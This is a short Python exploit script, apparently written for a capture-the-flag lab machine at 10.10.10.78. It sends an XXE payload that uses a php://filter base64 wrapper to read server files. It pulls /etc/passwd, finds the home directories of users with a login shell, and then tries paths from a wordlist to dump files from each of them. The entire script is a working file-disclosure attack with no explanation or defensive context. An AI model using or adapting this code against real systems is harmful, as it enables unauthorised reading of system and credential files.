import requests
from base64 import b64decode

def GetFile(fname):
    payload = """<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=%s"> ]>
<details>
    <subnet_mask>&example;</subnet_mask>
    <test></test>
</details>""" %(fname)

    response = requests.post('http://10.10.10.78/hosts.php', data=payload)
    fcontent = (response.text).split(" ")[6]
    fcontent = b64decode(fcontent)
    return(fcontent)

def GetHomeDir():
    homedir = []
    passwd = GetFile("/etc/passwd")
    lines = iter(passwd.splitlines())
    for line in lines:
        if line.endswith("sh"):
            line = line.split(":")[5]
            homedir.append(line)
    return(homedir)

for user in GetHomeDir():
    fh = open('pathtotest.txt')
    for line in fh:
        files = GetFile(user + line.rstrip())
        if files:
            print(user + line.rstrip())
            print(files)
